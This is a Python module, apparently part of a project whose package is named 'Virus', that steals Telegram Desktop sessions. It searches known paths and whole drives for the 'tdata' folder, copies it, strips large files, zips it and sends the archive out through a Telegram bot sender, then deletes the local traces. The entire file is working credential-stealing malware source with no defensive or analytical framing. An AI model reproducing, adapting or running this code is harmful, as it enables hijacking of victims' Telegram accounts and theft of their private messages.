import os
import shutil
from Virus.Helpers.Support import current_user
from Virus.Helpers.TG_bot_sender import Sender
tg_path = f'C:\\Users\\{current_user}\\AppData\\Local\\tdata'




paths_Telegram = (
    os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata",
    'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata',
)  # папки где могут храниться данные телеграмма


class Telegram:
    @staticmethod
    def telegram():
        for path in paths_Telegram:
            try:
                shutil.copytree(path, tg_path,
                                ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2",
                                                              "user_data#3", "webview"))
                # 1) откуда 2) куда 3) что не копировать.     Сама создает директорию, если она уже существует то вызывает ошибку
                break
            except:
                pass

        if not os.path.exists(tg_path):  # если нет папки -> включение поиска
            ignore_folders = []
            next_folder = True

            try:
                for root, dirs, files in os.walk("D:\\"):
                    # dirs = [d for d in dirs if d not in ignore_folders]
                    if 'Telegram Desktop' in dirs:
                        shutil.copytree(root + '\\Telegram Desktop\\tdata', tg_path,
                                        ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data",
                                                                      "user_data#2", "user_data#3", "webview"))
                        next_folder = False
                        break

                ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default']

                if next_folder:
                    for root, dirs, files in os.walk("C:\\"):
                        dirs = [d for d in dirs if d not in ignore_folders]
                        if 'Telegram Desktop' in dirs:
                            shutil.copytree(root + '\\Telegram Desktop', tg_path,
                                            ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data",
                                                                          "user_data#2", "user_data#3", "webview"))
                            break
            except:
                pass

        if not os.path.exists(tg_path):  # повторная проверка, если нет папки -> завершение процесса
            Sender.send_error("Telegram")
            return False

        # удаляем ненужные файлы размером больше 500кб
        for root, dirs, files in os.walk(tg_path):
            for file in files:  # проверка всех файлов в текущей директории
                if os.path.getsize(file_path := os.path.join(root, file)) > 540000:
                    os.remove(file_path)

        try:
            shutil.make_archive(tg_path, 'zip',
                                tg_path)  # 1) где вывести файл 2) формат 3) путь к папке которую надо упаковать
        except:
            pass

        try:
            shutil.rmtree(tg_path)  # удаляем папку с файлами
            return True
        except:
            pass

    @staticmethod
    def send_tg_logs():
        """ отправка телеграмм сессии """
        try:
            with open(tg_path + '.zip', 'rb') as tg:
                Sender.send_data(tg, "tg_logs")
        except:
            pass

        try:
            os.remove(tg_path + '.zip')  # удаляем файл
        except:
            pass

    @staticmethod
    def main():
        if Telegram.telegram():
            Telegram.send_tg_logs()
